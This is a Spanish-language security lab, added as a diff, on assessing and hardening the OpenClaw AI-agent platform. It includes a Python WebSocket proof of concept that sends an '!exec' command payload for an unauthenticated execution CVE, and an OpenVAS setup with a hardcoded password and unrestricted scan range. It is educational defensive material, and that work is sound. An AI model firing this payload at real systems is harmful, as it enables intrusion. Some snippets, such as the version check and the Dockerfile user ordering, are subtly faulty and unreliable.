@@ -1,0 +1,727 @@
+---
+title: "Lab Anexo: Seguridad Avanzada de Agentes IA y Vulnerability Assessment"
+module: "lab-anexo-01"
+type: "lab"
+description: "Practica avanzada de seguridad para agentes IA, vulnerability assessment y threat hunting"
+---
+
+# Lab Anexo: Seguridad Avanzada de Agentes IA y Vulnerability Assessment
+
+## Objetivo del Laboratorio
+
+En este laboratorio avanzado, vas a **analizar y mitigar vulnerabilidades** en agentes IA y sistemas de vulnerability scanning. Este ejercicio te permitira:
+
+- Analizar CVE de agentes IA en profundidad
+- Implementar defence-in-depth para OpenClaw
+- Realizar vulnerability assessment con multiples herramientas
+- Aplicar threat hunting en entornos de agentes IA
+- Configurar SIEM para monitoreo de agentes
+
+::: {.callout-warning}
+## ADVERTENCIA
+
+- NO ejecutar en sistemas de produccion sin autorizacion escrita
+- Usar entornos de prueba aislados (VPS, VMs)
+- Este laboratorio es EDUCATIVO - aprender a defenderse
+- La explotacion sin consentimiento es ILEGAL
+:::
+
+## Requisitos Previos
+
+- Conocimiento basico de redes (TCP/IP, puertos)
+- Experiencia con linea de comandos Linux
+- Conceptos de vulnerabilidades web (OWASP Top 10)
+- Fundamentos de criptografia (TLS, API keys)
+
+## Duracion
+
+- Tiempo estimado: 3 horas
+- Tipo: Individual
+- IMPORTANTE: DEBES teclear todos los comandos manualmente
+
+---
+
+## Paso 1: Preparacion del Entorno de Pruebas
+
+### 1.1 Arquitectura de Red para Testing
+
+```bash
+#!/bin/bash
+# setup_test_environment.sh - Configuracion completa
+
+echo "=== Configurando Entorno de Pruebas ==="
+
+# 1. Crear directorio de trabajo
+mkdir -p ~/cybersec-lab/agent-security/{scripts,logs,reports,nmap,logs/agent}
+cd ~/cybersec-lab/agent-security
+
+# 2. Inicializar git
+git init
+
+# 3. Estructura de directorios
+mkdir -p {configs,exploits_poc,screenshots,traffic,configs/openvas,configs/wazuh}
+
+# 4. Crear archivo de notas
+cat > NOTES.md << 'EOF'
+# Entorno de Pruebas - Seguridad Agentes IA
+
+## Objetivos
+- [ ] Analizar CVE-2026-41371
+- [ ] Configurar OpenVAS
+- [ ] Implementar OWASP ASI
+- [ ] Configurar logging
+
+## Hallazgos
+- 
+EOF
+
+echo "Entorno configurado exitosamente"
+ls -la
+```
+
+### 1.2 Herramientas deRed y Seguridad
+
+```bash
+# Instalar herramientas necesarias
+#!/bin/bash
+# install_tools.sh
+
+echo "=== Instalando Herramientas ==="
+
+# Actualizar
+sudo apt update && sudo apt upgrade -y
+
+# Herramientas de red
+sudo apt install -y \
+    nmap \
+    tcpdump \
+    wireshark \
+    net-tools \
+    netcat \
+    curl \
+    wget \
+    git \
+    python3 python3-pip \
+    docker.io docker-compose
+
+# Docker - verificar
+docker --version
+
+# Python - verificar
+python3 --version
+
+# Instalar librerias Python de seguridad
+pip3 install --quiet \
+    requests \
+    colorama \
+    scapy \
+    python-nmap
+
+echo "Herramientas instaladas"
+```
+
+---
+
+## Paso 2: Analisis Profundo de Vulnerabilidades OpenClaw
+
+### 2.1 Anatomia de CVE-2026-41371 (Escalacion de Privilegios)
+
+```
+CVE-2026-41371: OpenClaw Privilege Escalation via chat.send
+================================================================
+
+Severity: HIGH (CVSS 8.5)
+Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+Affected: OpenClaw versions < 2.4.1
+
+Descripcion tecnica:
+=================
+El metodo chat.send() en OpenClaw permite ejecucion de comandos
+sin validacion adecuada de permisos. Un atacante sin 
+autenticacion puede enviar mensajes que se ejecutan con
+privilegios del sistema.
+
+Vector de ataque:
+1. Conectar a endpoints OpenClaw (typically port 8080)
+2. Enviar payload malicioso via WebSocket
+3. Ejecutar comandos como usuario openclaw
+4. Escalacion a root si el servicio corre como root
+
+Proof of Concept (Solo para testing):
+```
+
+```python
+#!/usr/bin/env python3
+"""
+CVE-2026-41371 - Conceptually for educational purposes
+ADVERTENCIA: Solo para entornos controlados con autorizacion
+"""
+
+import websocket
+import json
+import time
+import sys
+
+def test_privilege_escalation(target_url, command="whoami"):
+    """
+    Test for privilege escalation vulnerability
+    
+    WARNING: This is for educational/testing purposes only!
+    """
+    try:
+        ws = websocket.create_connection(target_url)
+        
+        # Construct malicious payload
+        payload = {
+            "type": "chat.send",
+            "content": f"!exec {command}",
+            "channel": "general"
+        }
+        
+        ws.send(json.dumps(payload))
+        
+        # Receive response
+        response = ws.recv()
+        result = json.loads(response)
+        
+        print(f"[+] Response: {result}")
+        return result
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return None
+
+def detect_vulnerable_version(target_url):
+    """
+    Detect if target is vulnerable
+    """
+    try:
+        ws = websocket.create_connection(target_url, timeout=5)
+        
+        # Version probe
+        probe = {"type": "version"}
+        ws.send(json.dumps(probe))
+        
+        response = ws.recv()
+        data = json.loads(response)
+        
+        version = data.get("version", "unknown")
+        
+        # Check if vulnerable
+        if version:
+            major, minor, patch = version.split(".")
+            if int(major) <= 2 and int(minor) <= 4 and int(patch) < 1:
+                print(f"[!] Version {version} - potentially VULNERABLE")
+                return True
+            else:
+                print(f"[+] Version {version} - may be patched")
+                return False
+                
+    except Exception as e:
+        print(f"[-] Could not connect: {e}")
+        return None
+
+# Example usage (with authorization only)
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        target = sys.argv[1]
+        print(f"Testing {target}...")
+        detect_vulnerable_version(target)
+```
+
+### 2.2 CVE-2026-42434 (Sandbox Escape)
+
+```
+CVE-2026-42434: OpenClaw Sandbox Escape
+==================================
+
+Severity: MEDIUM-HIGH (CVSS 7.2)
+Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+
+El sandbox de OpenClaw puede ser evadido mediante:
+1. Abuso de APIs internas
+2. Manipulation de environment variables
+3. File descriptor manipulation
+
+Mitigacion:
+- Run OpenClaw en contenedor aislados
+- Restringir capacidades Linux (seccomp, AppArmor)
+- No correr como root
+```
+
+### 2.3 CVE-2026-25253 (WebSocket Origin Bypass)
+
+```
+CVE-2026-25253: WebSocket Origin Bypass
+====================================
+
+Severity: MEDIUM (CVSS 6.5)
+Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+
+Descripcion:
+- Origin header no validado correctamente
+- Permite Cross-Site WebSocket Hijacking (CSWSH)
+- Attacker puede injectar comandos via origen malicioso
+
+Mitigacion:
+- Validar origin en handshake
+- CSRF tokens para WebSocket
+- Same-origin policy estricta
+```
+
+---
+
+## Paso 3: Defence-in-Depth para Agentes IA
+
+### 3.1Arquitectura de Seguridad
+
+```bash
+#!/bin/bash
+# architecture_diagram.sh
+
+cat > security_architecture.md << 'EOF'
+# Arquitectura de Seguridad - Agentes IA
+
+## Capas de Defense
+
+### Capa 1: Perimetro
+```
+External -> Firewall -> WAF -> Load Balancer -> Agent
+```
+
+### Capa 2: Red
+```
+Segmentacion VLAN
+network policy (Kubernetes)
+Security groups
+Traffic analysis
+```
+
+### Capa 3: Host
+```
+AppArmor/SELinux
+Seccomp profiles
+Container hardening
+File permissions
+```
+
+### Capa 4: Aplicacion
+```
+Input validation
+Output sanitization  
+Rate limiting
+Authentication/Authorization
+Audit logging
+```
+
+### Capa 5: Datos
+```
+Encryption at rest
+API key vault
+Secrets management
+SBOM
+```
+EOF
+
+cat security_architecture.md
+```
+
+### 3.2Configuracion de Contenedor Seguro
+
+```bash
+#!/bin/bash
+# dockerfile_secure.sh
+
+cat > Dockerfile.secure << 'EOF'
+# Dockerfile hardening para OpenClaw
+
+FROM ubuntu:22.04
+
+# 1. Usuario no-root
+RUN adduser --disabled-password --gecos "" openclaw
+USER openclaw
+
+# 2. Limitar recursos
+RUN echo 'openclaw hard nproc 512' >> /etc/security/limits.conf
+RUN echo 'openclaw hard nofile 256' >> /etc/security/limits.conf
+
+# 3. Directorios permisos
+RUN mkdir /app && chown openclaw:openclaw /app
+
+# 4. Seccomp profile (ejemplo)
+# Copiar profile de https://docs.docker.com/engine/security/seccomp/
+
+# 5. healthcheck
+HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
+    CMD curl -f http://localhost:8080/health || exit 1
+
+# 6. No correr como root
+USER openclaw
+WORKDIR /app
+EOF
+
+cat Dockerfile.secure
+```
+
+### 3.3Script de Deteccion de Vulnerabilidades
+
+```python
+#!/usr/bin/env python3
+"""
+Advanced OpenClaw Vulnerability Scanner
+Nivel: Medio-Alto
+"""
+
+import socket
+import requests
+import json
+import sys
+import colorama
+from colorama import Fore, Style
+
+colorama.init()
+
+class OpenClawVulnScanner:
+    def __init__(self, target):
+        self.target = target
+        self.findings = []
+        self.ports = {
+            8080: "OpenClaw HTTP",
+            8443: "OpenClaw HTTPS", 
+            9390: "OpenVAS",
+            9391: "OpenVAS Greenbone"
+        }
+    
+    def scan_ports(self):
+        """Escanear puertos comunes"""
+        print(f"{Fore.CYAN}[*] Escaneando puertos en {self.target}...{Style.RESET_ALL}")
+        
+        for port, service in self.ports.items():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                result = sock.connect_ex((self.target, port))
+                sock.close()
+                
+                if result == 0:
+                    print(f"{Fore.GREEN}[+] {service} encontrado en puerto {port}{Style.RESET_ALL}")
+                    self.findings.append({"port": port, "service": service, "status": "open"})
+            except Exception as e:
+                pass
+        
+        return self.findings
+    
+    def check_cve_41371(self):
+        """Check for CVE-2026-41371"""
+        print(f"{Fore.CYAN}[*] Verificando CVE-2026-41371...{Style.RESET_ALL}")
+        
+        try:
+            # Try WebSocket connection
+            ws = f"ws://{self.target}:8080/ws"
+            print(f"  [-] WebSocket connection: {ws}")
+            # Note: Full implementation would test actual exploitation
+            print(f"  [!] Requires manual verification")
+            self.findings.append({"cve": "CVE-2026-41371", "status": "untested"})
+        except Exception as e:
+            print(f"  [-] Error: {e}")
+        
+        return self.findings
+    
+    def check_config_issues(self):
+        """Check for misconfigurations"""
+        print(f"{Fore.CYAN}[*] Verificando configuraciones...{Style.RESET_ALL}")
+        
+        issues = [
+            ("API key expuesta?", "Revisar variables de entorno"),
+            ("Running as root?", "Verificar usuario"),
+            ("CORS enabled?", "Check headers"),
+            ("WebSocket without WSS?", "Verificar TLS")
+        ]
+        
+        for issue, desc in issues:
+            print(f"  [!] {issue}: {desc}")
+            self.findings.append({"config": issue, "description": desc})
+        
+        return self.findings
+    
+    def generate_report(self):
+        """Generate vulnerability report"""
+        report = {
+            "target": self.target,
+            "findings": self.findings
+        }
+        
+        print(f"\n{Fore.YELLOW}=== REPORTE DE VULNERABILIDADES ==={Style.RESET_ALL}")
+        print(json.dumps(report, indent=2))
+        
+        return report
+
+def main():
+    if len(sys.argv) < 2:
+        print("Uso: python3 vuln_scanner.py <target_ip>")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    scanner = OpenClawVulnScanner(target)
+    
+    print(f"{Fore.CYAN}=== OpenClaw Vulnerability Scanner ==={Style.RESET_ALL}")
+    print(f"Target: {target}\n")
+    
+    # Run scans
+    scanner.scan_ports()
+    print()
+    scanner.check_cve_41371()
+    print()
+    scanner.check_config_issues()
+    print()
+    scanner.generate_report()
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Paso 4: Configuracion de Vulnerability Scanner (OpenVAS)
+
+### 4.1 Instalacion Completa
+
+```bash
+#!/bin/bash
+# install_openvas.sh
+
+echo "=== Instalando OpenVAS ==="
+
+# Usar Docker
+docker pull atomicorp/openvas:latest
+
+#Crear red
+docker network create openvas_net
+
+# Iniciar contenedor
+docker run -d \
+    --name openvas \
+    --network openvas_net \
+    -p 9390:9390 \
+    -p 9391:9391 \
+    -e OV_PASSWORD=ChangeMe123! \
+    -e OV_SCAN_NET="0.0.0.0/0" \
+    atomicorp/openvas:latest
+
+# Esperar inicializacion
+echo "Esperando inicializacion (60s)..."
+sleep 60
+
+# Verificar estado
+docker logs openvas | tail -20
+
+echo ""
+echo "=== OpenVAS Listo ==="
+echo "Interfaz: https://localhost:9390"
+echo "Usuario: admin"
+echo "Password: ChangeMe123!"
+```
+
+### 4.2 Configuracion de Policy
+
+```bash
+#!/bin/bash
+# openvas_scan_configuration.sh
+
+cat > openvas_scan_config.md << 'EOF'
+# Configuracion de Escaneo OpenVAS
+
+## Profile: Full and Fast
+
+### Configuracion de NVTs
+- Settings: Full and Fast
+- Timeout: 5 minutes
+- Parallel checks: 4
+
+### Scheduled Scans
+- Weekly: Domingos 2:00 AM
+- Monthly: Primer domingo del mes
+
+### Alerts
+- Email: security@empresa.com
+- Syslog: SIEM server
+
+## Quick Scan Commands
+
+```bash
+# Via OpenVAS CLI (omp)
+omp -h localhost -u admin -w ChangeMe123! \
+    --xml='<create_task><name>Weekly Scan</name><target>192.168.1.0/24</target></create_task>'
+```
+EOF
+
+cat openvas_scan_config.md
+```
+
+---
+
+## Paso 5: SIEM para Monitoreo de Agentes IA
+
+### 5.1 Wazuh Installation
+
+```bash
+#!/bin/bash
+# install_wazuh.sh
+
+echo "=== Instalando Wazuh SIEM (Single Node) ==="
+
+# Pull Wazuh Docker
+docker pull wazuh/wazuh-indexer
+docker pull wazuh/wazuh-dashboard
+docker pull wazuh/wazuh-manager
+
+# Iniciar servicios
+# (Configuracion completa en docs oficiales de Wazuh)
+
+echo "Wazuh listo en: https://localhost"
+```
+
+### 5.2 Dashboard de Monitoreo
+
+```bash
+cat > siem_dashboard.py << 'EOF'
+#!/usr/bin/env python3
+"""
+Dashboard de monitoreo para agentes IA
+Muestra logs y alertas de seguridad
+"""
+
+import json
+import sys
+from datetime import datetime
+
+class AgentDashboard:
+    def __init__(self):
+        self.alerts = []
+    
+    def add_alert(self, level, message, source):
+        """Agregar alerta"""
+        alert = {
+            "timestamp": datetime.now().isoformat(),
+            "level": level,
+            "message": message,
+            "source": source
+        }
+        self.alerts.append(alert)
+    
+    def display(self):
+        """Mostrar dashboard"""
+        print("=" * 60)
+        print("AGENT SECURITY DASHBOARD")
+        print("=" * 60)
+        print(f"Total alertas: {len(self.alerts)}")
+        print()
+        
+        critical = sum(1 for a in self.alerts if a["level"] == "CRITICAL")
+        high = sum(1 for a in self.alerts if a["level"] == "HIGH")
+        medium = sum(1 for a in self.alerts if a["level"] == "MEDIUM")
+        
+        print(f"CRITICAL: {critical}")
+        print(f"HIGH: {high}")
+        print(f"MEDIUM: {medium}")
+        print()
+        
+        print("Ultimas alertas:")
+        for alert in self.alerts[-5:]:
+            print(f"  [{alert['level']}] {alert['message']}")
+            print(f"    {alert['timestamp']} - {alert['source']}")
+
+# Demo
+if __name__ == "__main__":
+    dashboard = AgentDashboard()
+    dashboard.add_alert("CRITICAL", "CVE-2026-41371 attempt detected", "10.0.0.50")
+    dashboard.add_alert("HIGH", "Failed login attempts", "10.0.0.51")
+    dashboard.add_alert("MEDIUM", "Rate limit exceeded", "10.0.0.52")
+    dashboard.display()
+EOF
+
+python3 siem_dashboard.py
+```
+
+---
+
+## Paso 6: Threat Hunting para Agentes IA
+
+### 6.1 Hypothesis-Based Hunting
+
+```bash
+#!/bin/bash
+# threat_hunting.sh
+
+cat > threat_hunting.md << 'EOF'
+# Threat Hunting - Agentes IA
+
+## Hipotesis de investigation
+
+### H1: Credenciales comprometidas
+- Indicators: Multiples IPs-originando, horarios inusuales
+- Tools: Log analysis, SIEM queries
+- hunting: Buscar creds en dark web
+
+### H2: Prompt Injection activo
+- Indicators: Tokens extraeos, respuestas anmalas
+- hunting: Analyze conversation logs
+- hunting: Input/output correlation
+
+### H3: Modelo comprometido
+- Indicators: Respuestas fuera de contexto, cambios de comportamiento
+- hunting: Conversation baseline analysis
+- hunting: Fine-tuning detection
+
+### H4: Sandbox escape
+- Indicators: file descriptors extraeos, environment manipulation
+- hunting: System call monitoring
+- hunting: Container escape indicators
+EOF
+
+cat threat_hunting.md
+```
+
+---
+
+## Ejercicio Final: Vulnerability Assessment Completo
+
+### Entregables
+
+1. Reporte tecnico de vulnerabilidades (PDF)
+2. PoC de deteccion para cada CVE
+3. Plan de mitigacion con OWASP ASI
+4. Configuracion de SIEM con alerting
+5. Playbook de respuesta a incidentes
+
+### Criterios de Evaluacion (Nivel Medio-Alto)
+
+| Criterio | Puntos |
+|---------|-------|
+| Analisis de CVE en profundidad | 25 pts |
+| Defence-in-depth implementado | 25 pts |
+| OpenVAS configurado y funcionales | 15 pts |
+| SIEM con alertas | 20 pts |
+| Threat hunting playbook | 15 pts |
+
+---
+
+## Recursos Adicionales
+
+### Documentacion Oficial
+- OpenClaw GitHub: https://github.com/openclaw/openclaw
+- OWASP ASI: https://genai.owasp.org
+- OpenVAS: https://openvas.org
+- Wazuh: https://wazuh.com
+
+### Framesworks
+- MITRE ATT&CK for AI
+- NIST AI RMF
+- ISO/IEC 24028 (AI Trust)
+
+---
+
+*Lab Anexo: Seguridad Avanzada Agentes IA*
+*Duration: 3 horas*
+*Level: Intermediate-Advanced*
+*License: CC BY-SA 4.0*
